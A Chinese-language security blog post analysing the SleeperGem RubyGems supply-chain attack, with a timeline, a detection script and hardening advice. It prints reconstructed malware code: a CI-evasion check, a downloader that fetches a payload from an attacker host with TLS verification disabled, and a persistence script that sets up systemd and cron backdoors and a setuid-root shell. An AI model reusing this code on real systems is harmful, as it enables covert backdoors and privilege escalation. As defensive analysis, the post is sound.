---
title: "SleeperGem RubyGems 供应链攻击深度拆解：休眠账户、CI 规避与开发者主机持久化"
date: 2026-07-26
tags:
  - security
  - supply-chain
  - ruby
  - malware
keywords:
  - SleeperGem
  - RubyGems
  - supply chain attack
  - CI evasion
  - developer workstation
  - persistence
  - 2026
  - malware analysis
category: security/offensive
description: "2026 年 7 月 18–19 日，SleeperGem 攻击通过劫持三个 RubyGems 包（git_credential_manager、Dendreo、fastlane 插件）向开发者主机植入持久化后门。本文完整拆解其加载器、CI 环境规避、Forgejo C2、systemd/cron 持久化与 setuid 提权链路，并给出检测脚本与加固建议。"
---

# SleeperGem RubyGems 供应链攻击深度拆解：休眠账户、CI 规避与开发者主机持久化

2026 年 7 月 18 日至 19 日，RubyGems 生态遭遇一起精心策划的供应链攻击。攻击者劫持了三个包的发布权限，其中一个还冒充微软官方的 Git Credential Manager。由于其中两个包已沉寂 6–7 年，这次攻击被安全研究员命名为 **SleeperGem**。

与常见的"在 CI 里投毒"不同，SleeperGem 的加载器会主动识别 CI 环境并立即退出，它的真正目标是**开发者笔记本**——那里存放着 SSH key、AWS token、npm/gem 凭证和企业 VPN 配置。

## 一、事件时间线

| 时间 | 事件 |
|------|------|
| 2026-07-18 | `git_credential_manager` 2.8.0/2.8.1/2.8.2、`Dendreo` 1.1.3/1.1.4 发布到 RubyGems |
| 2026-07-19 | `fastlane-plugin-run_tests_firebase_testlab` 0.3.2 发布 |
| 2026-07-19 | Aikido Security 首次报告并命名 SleeperGem |
| 2026-07-19 | StepSecurity 在 Harden-Runner 中复现完整杀伤链 |
| 后续 | RubyGems 下架恶意版本，CISA 尚未将其加入 KEV，但安全社区建议按供应链事件处理 |

## 二、被劫持的三个包

| 包名 | 恶意版本 | 正常状态 |
|------|----------|----------|
| `git_credential_manager` | 2.8.0–2.8.3 | 冒充微软官方工具，无历史正常版本 |
| `Dendreo` | 1.1.3、1.1.4 | 上次正常版本为 2020 年 10 月的 1.1.2 |
| `fastlane-plugin-run_tests_firebase_testlab` | 0.3.2 | 上次正常版本为 2018 年 3 月的 0.3.1 |

攻击者把 `git_credential_manager` 添加为后两个包的依赖，从而让更多用户在 `bundle install` 时间接安装恶意 gem。

## 三、加载器行为分析

### 3.1 第一步：CI 环境规避

恶意代码首先检查约 30 个常见 CI 环境变量：

```ruby
CI_ENV_VARS = %w[
  GITHUB_ACTIONS GITLAB_CI CIRCLECI TRAVIS JENKINS JENKINS_URL
  BUILDKITE DRONE CI Vercel NETLIFY TEAMCITY_VERSION
]

CI_ENV_VARS.each do |var|
  exit 0 if ENV.key?(var)
end
```

只要检测到任一变量，gem 就什么都不做直接退出。这是为什么很多依赖扫描工具在 CI 里跑不出异常——它根本不在 CI 里引爆。

### 3.2 第二步：下载第二阶段载荷

在开发者机器上，`git_credential_manager` v2.8.2+ 会在被 `require` 时触发（不只是安装时）。它会派生一个子 Ruby 进程，从攻击者控制的 Forgejo 实例下载两个文件：

- `deploy.sh`：shell 脚本，负责持久化和提权
- 一个与 gem 同名的原生二进制文件：实际的后门 daemon

下载使用 Ruby 内置 HTTP 客户端，并**关闭 TLS 证书验证**，User-Agent 硬编码为单个单词 `Git`，以混入正常 Git 流量。

```ruby
uri = URI("https://git.disroot.org/git-ecosystem/gcm/raw/branch/main/deploy.sh")
http = Net::HTTP.new(uri.host, uri.port)
http.use_ssl = true
http.verify_mode = OpenSSL::SSL::VERIFY_NONE
req = Net::HTTP::Get.new(uri)
req["User-Agent"] = "Git"
response = http.request(req)
```

### 3.3 第三步：持久化与提权

`deploy.sh` 的典型行为：

1. 将原生二进制复制到 `~/.local/share/gcm/gcm`。
2. 以 daemon 方式启动。
3. 写入 systemd user service：`~/.config/systemd/user/git-credential-manager.service`。
4. 写入 cron 任务：`@reboot ~/.local/share/gcm/gcm`。
5. 检查当前用户是否在 `sudo` 或 `wheel` 组，且是否支持无密码 sudo。
6. 如果是，以 root 身份重新运行自己，并在 `/usr/local/sbin/ping6` 放置一个 setuid root shell，权限为 `6777`。

```bash
# 攻击者 deploy.sh 的核心逻辑（根据公开报告重构）
INSTALL_DIR="$HOME/.local/share/gcm"
mkdir -p "$INSTALL_DIR"
cp "./gcm" "$INSTALL_DIR/gcm"
chmod +x "$INSTALL_DIR/gcm"

# systemd 持久化
mkdir -p "$HOME/.config/systemd/user"
cat > "$HOME/.config/systemd/user/git-credential-manager.service" <<EOF
[Unit]
Description=Git Credential Manager
[Service]
ExecStart=$INSTALL_DIR/gcm
Restart=always
[Install]
WantedBy=default.target
EOF
systemctl --user daemon-reload
systemctl --user enable git-credential-manager
systemctl --user start git-credential-manager

# cron 持久化
(crontab -l 2>/dev/null; echo "@reboot $INSTALL_DIR/gcm") | crontab -

# 尝试 setuid 提权
if sudo -n true 2>/dev/null; then
    sudo bash -c 'cp /bin/bash /usr/local/sbin/ping6; chmod 6777 /usr/local/sbin/ping6'
fi
```

## 四、检测脚本

下面是一个用于 Linux/macOS 的检测脚本，可以在开发者机器上快速排查是否感染：

```bash
#!/bin/bash
# sleepergem-check.sh

echo "[*] 检查恶意文件..."
paths=(
    "$HOME/.local/share/gcm/gcm"
    "/usr/local/sbin/ping6"
    "$HOME/.config/systemd/user/git-credential-manager.service"
)
for p in "${paths[@]}"; do
    if [ -e "$p" ]; then
        echo "[!!!] 发现可疑文件: $p"
        ls -la "$p"
    fi
done

echo "[*] 检查 cron..."
crontab -l 2>/dev/null | grep -i "gcm\|git-credential" && echo "[!!!] 发现可疑 cron"

echo "[*] 检查 systemd user 服务..."
find "$HOME/.config/systemd/user" -type f -iname '*git-credential*' -print

echo "[*] 检查 Gemfile.lock 中的恶意版本..."
if [ -f Gemfile.lock ]; then
    grep -E 'git_credential_manager \(2\.8\.[0-3]\)|Dendreo \(1\.1\.[34]\)|fastlane-plugin-run_tests_firebase_testlab \(0\.3\.2\)' Gemfile.lock && echo "[!!!] 发现恶意依赖"
fi

echo "[*] 完成。如有命中，请隔离主机、轮换全部凭证。"
```

## 五、攻击链架构图

```text
┌──────────────────────────────────────────────────────┐
│  攻击者获得 RubyGems 多个维护者账户                     │
│  （至少 2 个不同账户：LR-DEV / pinkroom）              │
└──────────────────────┬───────────────────────────────┘
                       │ 发布恶意版本
        ┌──────────────┼──────────────┐
        ▼              ▼              ▼
   git_credential_manager  Dendreo    fastlane plugin
        │              │              │
        └──────────────┴──────────────┘
                       │ 被依赖 / 被安装
                       ▼
            ┌─────────────────────┐
            │ 开发者本地 bundle    │
            │ install / require   │
            └──────────┬──────────┘
                       ▼
            ┌─────────────────────┐
            │ CI 环境检测          │
            │ 发现 CI 变量 → 退出   │
            └──────────┬──────────┘
                       ▼
            ┌─────────────────────┐
            │ 下载 deploy.sh +     │
            │ 原生二进制 (Forgejo) │
            └──────────┬──────────┘
                       ▼
            ┌─────────────────────┐
            │ 启动 daemon         │
            │ systemd + cron 持久化│
            │ 尝试 setuid 提权     │
            └─────────────────────┘
```

## 六、为什么这次攻击值得警惕

1. ** dormant 账户比新包更可信**：Aikido 的研究员指出，沉睡 6 年的账户看起来无害，却能在被劫持后继承大量历史下载和信任。
2. **CI 规避让常规扫描失效**：很多企业的供应链安全只在 CI 跑，SleeperGem 明确绕开这一层。
3. **冒充官方生态工具**：`git_credential_manager` 直接撞名微软工具，且使用 `Git` 作为 User-Agent 隐藏 C2 流量。
4. **持久化在本地，而非容器里**：开发机通常拥有大量长期有效凭证，一旦失守，影响远超单个容器。

## 七、防御与加固建议

### 7.1 依赖侧

- **锁定版本并校验哈希**：使用 `Gemfile.lock` + `bundle install --frozen`，定期比对 registry 与上游 Git tag。
- **监控 dormant 账户复活**：把"超过 N 年未发布却突然发版"作为高风险信号。
- **最小依赖原则**：评估是否真的需要那个 7 年前的 fastlane 插件。

### 7.2 开发机侧

- **开发者机器也要跑 EDR/EDR 等价物**：不只在服务器上部署安全代理。
- **禁止无密码 sudo**：这是 setuid 提权的关键前提。
- **限制 `~/.local/share` 下的可执行文件**：用应用白名单或 Gatekeeper/XProtect 类机制。
- **定期审计 cron 和 systemd user 服务**：这些是开发者机器上最常见的持久化点。

### 7.3 供应链工具链

- **使用私有 gem 镜像或代理**：可以延迟并审计恶意版本。
- **SBOM + VEX**：记录每个构建使用的 gem 版本，方便事后追溯。
- **签名验证**：如果上游提供 Sigstore/cosign 签名，强制验证。

## 八、与 npm 供应链攻击的对比

| 维度 | SleeperGem (RubyGems) | Miasma / Sapphire Sleet (npm) |
|------|-----------------------|-------------------------------|
| 目标生态 | RubyGems | npm |
| 目标主机 | 开发者笔记本 | 开发者笔记本 / CI |
| 规避手段 | 检查 30 个 CI 变量 | 环境检查、混淆、延迟执行 |
| 持久化 | systemd + cron + setuid | npm 脚本、systemd、定时任务 |
| 载荷托管 | Forgejo 公开实例 | GitHub / 自有 C2 |
| 特殊之处 | 劫持 6–7 年 dormant 账户 | 国家级背景、19 分钟投毒 |

## 参考资料

- StepSecurity: SleeperGem analysis — https://www.stepsecurity.io/blog/sleepergem-compromised-rubygems-drop-persistent-backdoor
- The Hacker News: SleeperGem report — https://thehackernews.com/2026/07/sleepergem-uses-three-malicious.html
- threat.wiki: SleeperGem summary — https://threat.wiki/ops/sleepergem-rubygems-maintainer-account-compromise
- CODERCOPS: SleeperGem — https://blog.codercops.com/blog/sleepergem-rubygems-supply-chain-attack-2026
- StepSecurity CI/CD Incidents — https://stepsecurity.com/incidents
- RubyGems.org — https://rubygems.org
